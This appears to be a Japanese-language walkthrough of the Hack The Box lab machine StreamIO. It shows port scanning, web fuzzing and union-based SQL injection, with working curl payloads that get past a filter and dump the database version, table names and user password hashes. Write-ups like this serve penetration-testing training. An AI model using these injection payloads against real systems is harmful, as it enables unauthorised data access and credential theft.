https://app.hackthebox.com/machines/StreamIO

## STEP 1
```sh
└─$ rustscan -a 10.129.62.39 --no-banner --scripts none
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.129.62.39:53
Open 10.129.62.39:80
Open 10.129.62.39:88
Open 10.129.62.39:135
Open 10.129.62.39:139
Open 10.129.62.39:389
Open 10.129.62.39:443
Open 10.129.62.39:445
Open 10.129.62.39:464
Open 10.129.62.39:593
Open 10.129.62.39:636
Open 10.129.62.39:3268
Open 10.129.62.39:3269
Open 10.129.62.39:5985
Open 10.129.62.39:9389
Open 10.129.62.39:49667
Open 10.129.62.39:49677
Open 10.129.62.39:49678
Open 10.129.62.39:49705
Open 10.129.62.39:49731
10.129.62.39 -> [53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,49667,49677,49678,49705,49731]
```


## STEP 2
443番ポートの証明書からドメイン名を確認
```sh
└─$ openssl s_client -connect 10.129.62.39:443 | openssl x509 -nocert -ext subjectAltName
Connecting to 10.129.62.39
Can't use SSL_get_servername
depth=0 C=EU, CN=streamIO
verify error:num=18:self-signed certificate
verify return:1
depth=0 C=EU, CN=streamIO
verify error:num=10:certificate has expired
notAfter=Mar 24 07:03:28 2022 GMT
verify return:1
depth=0 C=EU, CN=streamIO
notAfter=Mar 24 07:03:28 2022 GMT
verify return:1
X509v3 Subject Alternative Name: 
    DNS:streamIO.htb, DNS:watch.streamIO.htb
^C
```
hosts編集
```sh
└─$ echo '10.129.62.39 streamio.htb watch.streamio.htb' | sudo tee -a /etc/hosts
10.129.62.39 streamio.htb watch.streamio.htb
```
443番アクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_01.png">  
列挙  
すべて403だが、adminのみレスポンスサイズが小さいね
```sh
└─$ ffuf -r  -u https://streamio.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

admin                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 262ms]
js                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 262ms]
images                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 266ms]
css                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 270ms]
Admin                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 480ms]
Images                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 263ms]
fonts                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 384ms]
CSS                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 257ms]
ADMIN                   [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 259ms]
JS                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 315ms]
Js                      [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 506ms]
Css                     [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 508ms]
IMAGES                  [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 261ms]
Fonts                   [Status: 403, Size: 1233, Words: 73, Lines: 30, Duration: 316ms]
:: Progress: [29999/29999] :: Job [1/1] :: 118 req/sec :: Duration: [0:03:40] :: Errors: 1 ::
```
```sh
└─$ ffuf -u https://streamio.htb/admin/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://streamio.htb/admin/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 490ms]
.                       [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 254ms]
Index.php               [Status: 403, Size: 18, Words: 1, Lines: 1, Duration: 298ms]
master.php              [Status: 200, Size: 58, Words: 5, Lines: 2, Duration: 329ms]
:: Progress: [17129/17129] :: Job [1/1] :: 137 req/sec :: Duration: [0:02:02] :: Errors: 0 ::
```

## STEP 3
サブドメインにアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_02.png">  
列挙
```sh
└─$ ffuf -u https://watch.streamio.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://watch.streamio.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-files.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 268ms]
favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 601ms]
search.php              [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 734ms]
.                       [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 337ms]
blocked.php             [Status: 200, Size: 677, Words: 28, Lines: 20, Duration: 337ms]
Search.php              [Status: 200, Size: 253887, Words: 12366, Lines: 7194, Duration: 269ms]
Index.php               [Status: 200, Size: 2829, Words: 202, Lines: 79, Duration: 565ms]
Favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 262ms]
favicon.ICO             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 278ms]
:: Progress: [17129/17129] :: Job [1/1] :: 131 req/sec :: Duration: [0:02:03] :: Errors: 0 ::
```
search.phpにアクセス  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_03.png">  
フォーム内に入力した文字列に部分一致した結果が返されるwebページであった  
入力した文字列は、httpsリクエストデータ内の「q」パラメータに格納されることを確認  
この際のバックエンドのsqlサーバで動作するsqlは、
```sql
# mssql の場合
select name from table where name like '%入力文字列%' 
```
になると予想  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_04.png">  
みんな大好き[portswigger](https://portswigger.net/web-security/sql-injection#what-is-sql-injection-sqli)のサイトを使ってsqlインジェクションを考える  
まずはコメントアウトが動作するか確認  
```sql
# oracle, mssql, PostgreSQL が動作する
select name from table where name like '%showman'-- %' 
```
みごとコメントアウトが動作した  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_05.png">  
次にunion演算子を使用して悪意あるsqlを結合できるかテスト  
[リンク](https://portswigger.net/web-security/sql-injection/union-attacks)で確認できる通り、２つのsql文の結果は同じ列数かつ同じ列の型でないといけない  
列数を把握するために便利なunionインジェクションの一例として
```sql
' ORDER BY 1--
' ORDER BY 1--
# や
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```
などが使用できるが、こいつらを入力すると別ページにリダイレクトされる仕組みになっていた  
どうやら`order`や`null`文字列がwafみたいなやつにひっかかったぽい  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_06.png">  
他にも下記のsqlで列数を把握できるため試行
```sql
# select 1,2 だと２列のテーブルを表示する
' UNION SELECT 1--
' UNION SELECT 1,2--
```
ちなみにunion対象のテーブルは文字列型のデータっぽいので、インジェクションするデータも文字列型を指定する  
すると６列のテーブルを結合すると結果が確認できた、ちなみにテーブルの２列目がwebページに表示されているイメージ  
<img src="https://github.com/mylovemyon/hackthebox_images/blob/main/StreamIO_07.png">  


## STEP 4
burpsuiteでhttpsリクエストの仕組みが分かっていので、あとはコマンドラインで引き続きsqlインジェクション  
まずはsqlのバージョンを確認していくと、mssqlの構文でバージョン情報を確認できた
```sh
└─$ curl -d "q=testtest' union select '1',@@version,'3','4','5','6'--" -k https://watch.streamio.htb/search.php

~~~
    <div>
        <div class="d-flex movie align-items-end">
            <div class="mr-auto p-2">
                <h5 class="p-2">Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) 
                    Sep 24 2019 13:48:23 
                    Copyright (C) 2019 Microsoft Corporation
                    Express Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
                </h5>
            </div>
        <div class="ms-auto p-2">
                <span class="">3</span>
                <button class="btn btn-dark" onclick="unavailable();">Watch</button>
        </div>
    </div>
~~~
```
mssqlの構文は残念ながら詳しくないので、[swisskyrepo](https://swisskyrepo.github.io/PayloadsAllTheThings/SQL%20Injection/MSSQL%20Injection/#mssql-enumeration)のチートシートを使っていく  
テーブルをリストすると「movies」と「users」を確認、moviesはフォーラムで入力した文字列の検索先のテーブルでしょう
```sh
└─$ curl -d "q=testtest' union select '1',table_name,'3','4','5','6' from information_schema.tables--" -k -s https://watch.streamio.htb/search.php | grep '<h5'
                <h5 class="p-2">movies</h5>
                <h5 class="p-2">users</h5>
```
usersテーブルの列名を確認
```sh
└─$ curl -d "q=testtest' union select '1',column_name,'3','4','5','6' from information_schema.columns where table_name='users'--" -k -s https://watch.streamio.htb/search.php | grep '<h5'
                <h5 class="p-2">id</h5>
                <h5 class="p-2">is_staff</h5>
                <h5 class="p-2">password</h5>
                <h5 class="p-2">username</h5>
```
```sh
└─$ curl -d "q=testtest' union select '1',password,'3','4','5','6' from users--" -k -s https://watch.streamio.htb/search.php | grep '<h5'
                <h5 class="p-2">0049ac57646627b8d7aeaccf8b6a936f                  </h5>
                <h5 class="p-2">08344b85b329d7efd611b7a7743e8a09                  </h5>
                <h5 class="p-2">083ffae904143c4796e464dac33c1f7d                  </h5>
                <h5 class="p-2">0cfaaaafb559f081df2befbe66686de0                  </h5>
                <h5 class="p-2">1c2b3d8270321140e5153f6637d3ee53                  </h5>
                <h5 class="p-2">22ee218331afd081b0dcd8115284bae3                  </h5>
                <h5 class="p-2">2a4e2cf22dd8fcb45adcb91be1e22ae8                  </h5>
                <h5 class="p-2">35394484d89fcfdb3c5e447fe749d213                  </h5>
                <h5 class="p-2">3577c47eb1e12c8ba021611e1280753c                  </h5>
                <h5 class="p-2">384463526d288edcc95fc3701e523bc7                  </h5>
                <h5 class="p-2">3961548825e3e21df5646cafe11c6c76                  </h5>
                <h5 class="p-2">54c88b2dbd7b1a84012fabc1a4c73415                  </h5>
                <h5 class="p-2">665a50ac9eaa781e4f7f04199db97a11                  </h5>
                <h5 class="p-2">6dcd87740abb64edfa36d170f0d5450d                  </h5>
                <h5 class="p-2">7df45a9e3de3863807c026ba48e55fb3                  </h5>
                <h5 class="p-2">8097cedd612cc37c29db152b6e9edbd3                  </h5>
                <h5 class="p-2">925e5408ecb67aea449373d668b7359e                  </h5>
                <h5 class="p-2">b22abb47a02b52d5dfa27fb0b534f693                  </h5>
                <h5 class="p-2">b779ba15cedfd22a023c4d8bcf5f2332                  </h5>
                <h5 class="p-2">b83439b16f844bd6ffe35c02fe21b3c0                  </h5>
                <h5 class="p-2">bf55e15b119860a6e6b5a164377da719                  </h5>
                <h5 class="p-2">c660060492d9edcaa8332d89c99c9239                  </h5>
                <h5 class="p-2">d62be0dc82071bccc1322d64ec5b6c51                  </h5>
                <h5 class="p-2">dc332fb5576e9631c9dae83f194f8e70                  </h5>
                <h5 class="p-2">ec33265e5fc8c2f1b0c137bb7b3632b5                  </h5>
                <h5 class="p-2">ee0b8a0937abd60c2882eacb2f8dc49f                  </h5>
                <h5 class="p-2">ef8f3d30a856cf166fb8215aca93e9ff                  </h5>
                <h5 class="p-2">f03b910e2bd0313a23fdd7575f34a694                  </h5>
                <h5 class="p-2">f87d3c0d6c8fd686aacc6627f1f493a5                  </h5>
                <h5 class="p-2">fd78db29173a5cf701bd69027cb9bf6b                  </h5>
```
